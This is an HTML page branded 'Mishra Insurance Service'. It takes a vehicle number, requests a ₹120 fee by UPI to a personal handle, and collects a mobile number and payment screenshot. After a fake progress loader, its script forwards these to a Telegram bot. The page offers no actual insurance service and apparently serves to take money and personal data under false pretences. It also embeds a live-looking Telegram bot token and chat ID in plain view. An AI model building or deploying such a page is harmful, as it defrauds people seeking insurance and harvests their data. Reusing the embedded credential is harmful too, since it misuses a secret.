<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mishra Insurance Service</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial}

body{
min-height:100vh;
background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#1c92d2);
background-size:400% 400%;
animation:rgbMove 12s ease infinite;
color:#fff;
}

@keyframes rgbMove{
0%{background-position:0% 50%}
50%{background-position:100% 50%}
100%{background-position:0% 50%}
}

/* TOP BAR */
.topbar{
position:fixed;
top:0;
left:0;
width:100%;
height:60px;
background:rgba(0,0,0,0.4);
display:flex;
align-items:center;
justify-content:space-between;
padding:0 20px;
backdrop-filter:blur(8px);
z-index:1000;
}

.topbar button{
padding:8px 16px;
border:none;
border-radius:8px;
background:#00f2fe;
color:#000;
font-weight:600;
cursor:pointer;
}

.menu-icon div{
width:25px;
height:3px;
background:#fff;
margin:4px 0;
}

/* SIDE MENU */
.sideMenu{
position:fixed;
right:-260px;
top:0;
width:250px;
height:100%;
background:#111;
padding-top:80px;
transition:0.4s;
z-index:999;
}

.sideMenu button{
width:90%;
margin:10px 5%;
padding:12px;
border:none;
border-radius:8px;
background:#1c92d2;
color:#fff;
cursor:pointer;
}

.openMenu{right:0}

/* CARD */
.card{
margin-top:120px;
width:92%;
max-width:420px;
margin-left:auto;
margin-right:auto;
background:rgba(255,255,255,0.1);
padding:30px;
border-radius:18px;
backdrop-filter:blur(10px);
text-align:center;
}

input{
width:100%;
padding:14px;
margin-top:14px;
border-radius:10px;
border:none;
font-size:15px;
text-transform:uppercase;
}

/* Neon Button */
.neonBtn{
width:100%;
padding:14px;
margin-top:14px;
border:none;
border-radius:10px;
font-weight:600;
cursor:pointer;
background:#000;
color:#fff;
animation:neon 2s infinite alternate;
}

@keyframes neon{
0%{box-shadow:0 0 10px #00f2fe}
50%{box-shadow:0 0 20px #ff00ff}
100%{box-shadow:0 0 20px #43e97b}
}

.neonBtn:active{
transform:scale(0.95);
}

/* Loader */
.loader{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.8);
display:none;
align-items:center;
justify-content:center;
flex-direction:column;
z-index:2000;
}

.spinner{
width:60px;
height:60px;
border:6px solid #fff;
border-top:6px solid #00f2fe;
border-radius:50%;
animation:spin 1s linear infinite;
}

@keyframes spin{
100%{transform:rotate(360deg)}
}

.progress{
margin-top:15px;
font-size:18px;
}

.hidden{display:none}

.footer{
text-align:center;
margin-top:40px;
padding:20px;
font-size:14px;
opacity:0.8;
}

.qr{
width:180px;
margin-top:15px;
}

</style>
</head>
<body>

<div class="topbar">
<button onclick="goHome()">Home</button>
<div class="menu-icon" onclick="toggleMenu()">
<div></div><div></div><div></div>
</div>
</div>

<div class="sideMenu" id="menu">
<button onclick="openInsurance()">Insurance</button>
<button onclick="openAbout()">About</button>
<button onclick="openContact()">Contact</button>
<button onclick="openDisclaimer()">Disclaimer</button>
</div>

<div class="loader" id="loader">
<div class="spinner"></div>
<div class="progress" id="progressText">0%</div>
</div>

<div class="card">

<div id="homePage">
<h3>Enter Vehicle Number</h3>
<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
<button class="neonBtn" onclick="goPay()">Continue</button>
</div>

<div id="payPage" class="hidden">
<h3>Service Fee ₹120</h3>

<button class="neonBtn"
onclick="vibrate(); window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
Pay with UPI
</button>

<img class="qr"
src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR">

<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">

<button class="neonBtn" onclick="submitForm()">Submit</button>
<button class="neonBtn" onclick="goHome()">Back</button>
</div>

</div>

<div class="footer">
© 2026 Mishra Insurance Service. All rights reserved.
</div>

<script>

const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

function vibrate(){
if(navigator.vibrate) navigator.vibrate(80);
}

function toggleMenu(){
menu.classList.toggle("openMenu");
}

function goHome(){
vibrate();
homePage.classList.remove("hidden");
payPage.classList.add("hidden");
}

function openInsurance(){goHome();}
function openAbout(){alert("About Page");}
function openContact(){window.location.href="https://t.me/yourtelegramusername";}
function openDisclaimer(){alert("Private Service Platform");}

function goPay(){
if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
vibrate();
homePage.classList.add("hidden");
payPage.classList.remove("hidden");
}

function formatVehicle(input){
let v=input.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase();
if(v.length>2) v=v.slice(0,2)+"-"+v.slice(2);
if(v.length>5) v=v.slice(0,5)+"-"+v.slice(5);
if(v.length>8) v=v.slice(0,8)+"-"+v.slice(8,12);
input.value=v;
}

function submitForm(){
if(mobile.value.length<10){alert("Enter valid mobile");return;}
if(!proof.files[0]){alert("Upload screenshot");return;}

vibrate();
loader.style.display="flex";
let percent=0;
let interval=setInterval(()=>{
percent++;
progressText.innerText=percent+"%";
if(percent>=100){
clearInterval(interval);
sendData();
}
},30);
}

function sendData(){
let data=new FormData();
data.append("chat_id",chatId);
data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
data.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{
method:"POST",
body:data
})
.then(()=>{
loader.style.display="none";
alert("✅ Submitted Successfully");
goHome();
})
.catch(()=>{
loader.style.display="none";
alert("❌ Submission Failed");
});
}

</script>

</body>
</html>
